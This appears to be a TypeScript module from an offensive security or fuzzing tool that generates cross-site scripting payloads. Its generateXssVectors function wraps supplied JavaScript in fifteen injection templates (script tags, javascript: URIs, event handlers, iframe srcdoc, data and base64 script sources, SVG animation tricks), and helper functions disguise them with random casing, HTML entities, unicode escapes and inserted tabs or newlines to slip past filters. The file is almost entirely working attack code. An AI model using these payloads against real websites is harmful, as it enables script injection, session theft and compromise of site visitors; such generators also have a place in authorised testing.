import { Base64 } from "js-base64";

const encodeHtml = (value: string) => {
    return value
        .replaceAll("&", "&amp;")
        .replaceAll("<", "&lt;")
        .replaceAll(">", "&gt;")
        .replaceAll("\"", "&quot;")
        .replaceAll("'", "&apos;");
};

const randomizeCase = (value: string) => {
    return value
        .split("")
        .map(char => (Math.random() < 0.4 ? char.toUpperCase() : char.toLowerCase()))
        .join("");
};

const randomizeEntity = (value: string) => {
    return value
        .split("")
        .map(char => {
            const randomNumber = Math.random();
            if (char === ":") return "&colon;";
            if (char === ";") return "&semi;";
            if (char === "'") return "&apos;";
            if (char === "\"") return "&quot;";
            if (char === " ") return "&nbsp;";
            if (char === "<") return "&lt;";
            if (char === ">") return "&gt;";
            if (char === "&") return "&amp;";
            if (char === "\t") return "&#x09;";
            if (char === "\n") return "&#x0a;";
            if (randomNumber < 0.1) return `&#${char.charCodeAt(0)};`;
            if (randomNumber < 0.2) return `&#x${char.charCodeAt(0).toString(16)};`;
            return char;
        })
        .join("");
};

const randomizeUnicode = (value: string) => {
    return value
        .split("")
        .map(char => (Math.random() < 0.2 ? `\\u${(`0000${char.charCodeAt(0).toString(16)}`).slice(-4)}` : char))
        .join("");
};

const insertRandomChar = (value: string, chars: string[]) => {
    let next = "";
    for (let index = 0; index < value.length; index++) {
        next += value[index];
        if (index < value.length - 1) {
            next += chars[Math.floor(Math.random() * chars.length)];
        }
    }
    return next;
};

const javascriptUri = (input: string) => {
    return `${randomizeCase(insertRandomChar("javascript", ["\t", "\n"]))}:${input};`;
};

export const generateXssVectors = (input: string) => {
    const uri = javascriptUri(input);
    return [
        `<${randomizeCase("script")}>${randomizeUnicode(input)}</${randomizeCase("script")}>`,
        `<${randomizeCase("a")} ${randomizeCase("href")}="${randomizeEntity(uri)}">XSS</${randomizeCase("a")}>`,
        `<${randomizeCase("body")} ${randomizeCase("onload")}="${randomizeEntity(input)}">`,
        `<${randomizeCase("embed")} ${randomizeCase("src")}="${randomizeEntity(uri)}">`,
        `<${randomizeCase("form")} ${randomizeCase("action")}="${randomizeEntity(uri)}"><${randomizeCase("input")} type=submit value=XSS>`,
        `<${randomizeCase("iframe")} ${randomizeCase("srcdoc")}="${encodeHtml(`<img src=1 onerror='`)}${input}'>"></${randomizeCase("iframe")}>`,
        `<${randomizeCase("iframe")} ${randomizeCase("src")}="${randomizeEntity(uri)}"></${randomizeCase("iframe")}>`,
        `<${randomizeCase("img")} src=x ${randomizeCase("onerror")}="${encodeHtml(input)}">`,
        `<${randomizeCase("meta")} http-equiv="refresh" content="0; url=${randomizeEntity(uri)}">`,
        `<${randomizeCase("object")} ${randomizeCase("data")}="${randomizeEntity(uri)}">`,
        `<${randomizeCase("script")} ${randomizeCase("src")}="data:text/javascript,${input}"></${randomizeCase("script")}>`,
        `<${randomizeCase("script")} ${randomizeCase("src")}="data:text/javascript;base64,${Base64.encode(input)}"></${randomizeCase("script")}>`,
        `<${randomizeCase("script")}>import('data:text/javascript,${input}')</${randomizeCase("script")}>`,
        `<${randomizeCase("svg")}><${randomizeCase("a")} xlink:href="${randomizeEntity(uri)}"><${randomizeCase("text")} x="20" y="20">XSS</text></${randomizeCase("a")}>`,
        `<${randomizeCase("svg")}><${randomizeCase("set")} xlink:href=#xss attributeName=href from=? to="${randomizeEntity(uri)}" /><${randomizeCase("a")} id=xss><text x=20 y=20>XSS</text></${randomizeCase("a")}>`,
    ];
};
